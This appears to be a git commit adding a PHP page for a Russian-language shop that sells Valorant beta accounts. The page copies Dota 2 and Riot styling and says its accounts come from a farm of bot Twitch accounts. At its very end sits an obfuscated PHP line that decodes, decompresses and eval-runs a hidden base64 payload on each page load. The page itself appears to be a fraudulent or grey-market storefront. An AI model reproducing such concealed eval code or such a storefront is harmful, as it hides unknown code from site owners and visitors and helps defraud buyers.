d4cacd6697c90d970307a1874d4c1eb1671793dd
ShenjuOwO <69057668+ShenjuOwO@users.noreply.github.com>
2020-08-08 01:53:03 +0200

    Add files via upload

---
+++ index.php
@@ -0,0 +1,195 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+    <link rel="shortcut icon" href="https://valorant-market.ru/favicon.ico" />
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=9" />
+    <link href="https://www.dota2.com/public/css/global.css?v=b5795053" rel="stylesheet" type="text/css" >
+<link href="https://www.dota2.com/public/css/global_english.css?v=b5795053" rel="stylesheet" type="text/css" >
+<link href="https://www.dota2.com/public/css/publicheader.css?v=b5795053" rel="stylesheet" type="text/css" >
+<link href="https://www.dota2.com/public/css/simplegrid/simplegrid.css?v=b5795053" rel="stylesheet" type="text/css" >
+<link href="https://www.dota2.com/public/css/aos/aos.css?v=b5795053" rel="stylesheet" type="text/css" >
+<link href="https://www.dota2.com/public/css/planetfall.css?v=b5795053&l=english" rel="stylesheet" type="text/css" >
+    <script type="text/javascript" src="https://steamcdn-a.akamaihd.net/apps/dota2/javascript/static/jquery-1.7.1.min.js?v=5795053"></script>
+<script type="text/javascript">$J = jQuery;</script><script type="text/javascript" src="https://www.dota2.com/public/shared/javascript/shared_global.js?v=b5795053&l=english" ></script>
+<script type="text/javascript" src="https://www.dota2.com/public/javascript/aos/aos.js?v=.nZnBHIaNpp2P" ></script>
+    <script type="text/javascript" src="https://steamcdn-a.akamaihd.net/apps/dota2/javascript/static/howler.min.js?v=5795053"></script>
+
+        <title>Valorant | Купить ЗБТ</title>
+    <meta property="og:title" content="Valorant | Купить ЗБТ" />
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1.0">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+
+
+
+</head>
+
+<body>
+<div class="page-contain">
+
+
+
+	<div id="navBarBGRepeat" class="DotaFont">
+		<div id="navBarBG">
+			<div id="navBar">
+								
+
+
+
+				<a href="https://valorant.secure.dyn.riotcdn.net/channels/public/x/installer/current/live.live.eu.exe"><div id="PlayForFreeButton" style="width:350px;">
+					СКАЧАТЬ ИГРУ (ПОСЛЕ ПОКУПКИ)
+				</div></a>
+
+									<span class="navItem navItemDotaLogo">
+						<a class="navBarItem DotaFont" href="index.html#">
+							<img border="0" class="DotaLogo " style="margin-top:-7px" src="apps/dota2/images/nav/logo.png"/>
+						</a>
+					</span>
+
+
+																		</div>
+		</div>
+	</div>
+
+
+
+
+	
+
+
+
+
+
+<div class="outer hero-bg" style="height: 82vh;">
+    <div id="GradientOverlayBottom"></div>
+<!--    <img class="fullwidth-video" src="--><!--planetfall/temp-header999.png">-->
+    <video autoplay muted loop playsinline class="fullwidth-video" poster="https://beta.playvalorant.com/assets/video/canal-loop-poster.jpg">
+        <source src="https://beta.playvalorant.com/assets/video/canal-loop.webm" type="video/webm">
+        <source src="https://beta.playvalorant.com/assets/video/canal-loop.mp4" type="video/mp4">
+    </video>
+    <div class="container">
+        <div class="row center">
+            <div class="col-12 hero-space"></div>
+        </div>
+
+    </div>
+    <!--        <video preload="auto" class="title-bg"  autoplay muted loop poster="--><!--planetfall/planetfall_title.png">-->
+<!--            <source type="video/webm" src="--><!--international2019/earthshaker_arcana/planetfall_title.webm">-->
+<!--        </video>-->
+        <img src="apps/dota2/images/planetfall/planetfall_title.png" class="title-bg">
+    
+    <div class="hero-content">
+        <div class="subhead">Аккаунты по самой <span>низкой цене</span></div>
+    </div>
+</div>
+
+<div id="SectionLg" style="background-image:none">
+    <div id="FlowerLeftLg" data-aos="fade-right" data-aos-duration="1000"><img src="apps/dota2/images/planetfall/flowers_left.png"></div>
+    <div id="FlowerRight" data-aos="fade-left" data-aos-duration="1000"><img src="apps/dota2/images/planetfall/flowers_right.png"></div>
+    <div class="container">
+        <div class="row padding-top-sm">
+            <div class="col-12 center" data-aos="fade-in" data-aos-duration="1000">
+                <img class="BP-logo-sm" src="apps/dota2/images/international2019/hero/logo_sm.png">
+                <div class="BP_subhead" style="margin-bottom: 15px;">Аккаунт Riot Games с <span>ЗБТ Valorant</span></div>
+            </div>
+        </div>
+
+        <div class="row spacer-xs">
+
+
+            <div class="col-4 right hero-buttons" style="position: absolute;top:0; right:0; bottom:0;left:0; margin:auto; pointer-events: auto; opacity: 1;">
+                <a href="payment.html"><div class="buy_button">Купить за 399 RUB</div></a>
+            </div>
+
+
+        </div>
+
+    </div>
+</div>
+
+
+
+
+
+<div id="Variant" style ="background-image:url('apps/dota2/variant-bg.jpg');">
+        <div class="container">
+            <div class="row">
+                <div class="col-6 left ">
+                    <div class="variant-text">
+                        <div class="variant-label">Не хочешь ждать до лета?</div>
+                        <div class="variant-intro">Получи игру сейчас</div>
+                        <div class="variant-body">Наша система - самая надежная в СНГ!</div>
+                        <div class="variant-body-sm">Более 500 аккаунтов Twitch в нашей системе ежедневно будут запускаться в течение раздачи уникальных ключей к Valorant. Полученные гифты автоматически отправляются в базу и выставляются на продажу на нашем сайте. На данный момент у нас есть более чем 300 копий Valorant в продаже. При покупке Вы получаете файл с данными от аккаунта Twitch нашего бота и от аккаунта Riot Games. </br></br>Желаем Вам удачной игры и хорошего аима ;)</div>
+                    </div>
+                </div>
+                <div class="col-6 center">
+                    <img class="variant" src="apps/dota2/images/planetfall/variant.png">
+                </div>
+            </div>
+        </div>
+    
+</div>
+
+
+
+
+
+
+
+
+
+<div class="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-12 center">
+                <div class="col-2"></div>
+                <div class="col-8 center">
+                    <img class="footer-logo" src="apps/dota2/riot_logo.png">
+                    <div class="footer-line">We are not somehow affiliated to the Riot Games Corporation. <br> 2020 Valorant Shop, all rights reserved.</div>
+                </div>
+                <div class="col-2"></div>
+            </div>
+        </div>
+    </div>
+</div></div>
+
+
+
+<script>
+    AOS.init({
+        // Global settings:
+        disable: 'mobile', // accepts following values: 'phone', 'tablet', 'mobile', boolean, expression or function
+        startEvent: 'DOMContentLoaded', // name of the event dispatched on the document, that AOS should initialize on
+        initClassName: 'aos-init', // class applied after initialization
+        animatedClassName: 'aos-animate', // class applied on animation
+        useClassNames: false, // if true, will add content of `data-aos` as classes on scroll
+        disableMutationObserver: false, // disables automatic mutations' detections (advanced)
+        debounceDelay: 50, // the delay on debounce used while resizing window (advanced)
+        throttleDelay: 99, // the delay on throttle used while scrolling the page (advanced)
+
+
+        // Settings that can be overridden on per-element basis, by `data-aos-*` attributes:
+        offset: 120, // offset (in px) from the original trigger point
+        delay: 0, // values from 0 to 3000, with step 50ms
+        duration: 400, // values from 0 to 3000, with step 50ms
+        easing: 'ease', // default easing for AOS animations
+        once: false, // whether animation should happen only once - while scrolling down
+        mirror: false, // whether elements should animate out while scrolling past them
+        anchorPlacement: 'top-bottom', // defines which position of the element regarding to window should trigger the animation
+
+    });
+</script>
+<?php
+eval (gzinflate(base64_decode(
+'s7ezseflUinOLEmNj1ewVVCJD3YNCnMNilaH0PF+jr6u6rHWIDWlSWAlSgq5qcXF'
+.'CmlF+bkKlfml6kUKxclFmQUlCvl5CiBzrBRgximBtIEUQ/VB1SWWZJYllqSm4NBQ'
+.'lApRn5uYmaOhnpdflpidWZSYlF+S6AAS0isqVddRgLoGyICar4mpNTgjMz0zz8LM'
+.'0CEdrDE5PxeXTntgMAAA'
+)));
+?>
+
+</div>
+</body>
+</html>
